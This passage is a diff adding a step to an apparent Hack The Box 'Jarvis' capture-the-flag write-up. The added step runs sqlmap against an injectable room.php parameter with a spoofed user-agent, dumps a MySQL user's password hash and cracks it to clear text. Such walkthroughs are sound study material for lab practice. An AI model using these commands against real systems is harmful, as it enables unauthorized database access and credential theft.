@@ -81,8 +81,40 @@ ________________________________________________________________________________
 
 ![](https://raw.githubusercontent.com/cassioplima/cassioplima.github.io/master/images/jarvis/Captura%20de%20tela%20em%202019-11-10%2002-19-10.png)
 
-##
+### I used the sqlmap to dump the users and passwords hashes, the `--passwords` flag is for that
 
+``sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36" --passwords``
+
+```
+[04:27:04] [INFO] fetching database users password hashes
+[04:27:04] [INFO] fetching database users
+[04:27:04] [INFO] fetching number of database users
+[04:27:04] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[04:27:04] [INFO] retrieved: 1
+[04:27:05] [INFO] retrieved: 'DBadmin'@'localhost'
+[04:27:26] [INFO] fetching number of password hashes for user 'DBadmin'
+[04:27:26] [INFO] retrieved: 1
+[04:27:27] [INFO] fetching password hashes for user 'DBadmin'
+[04:27:27] [INFO] retrieved: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[04:33:12] [INFO] writing hashes to a temporary file '/tmp/sqlmapNCB3gB4320/sqlmaphashes-u13BSC.txt' 
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] y
+[04:33:16] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[04:33:19] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] n
+[04:33:22] [INFO] starting dictionary-based cracking (mysql_passwd)
+[04:33:22] [INFO] starting 4 processes 
+[04:33:25] [INFO] cracked password 'imissyou' for user 'DBadmin'                                                                                                                             
+database management system users password hashes:                                                                                                                                            
+[*] DBadmin [1]:
+    password hash: *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+    clear-text password: imissyou
+```
 
 
 
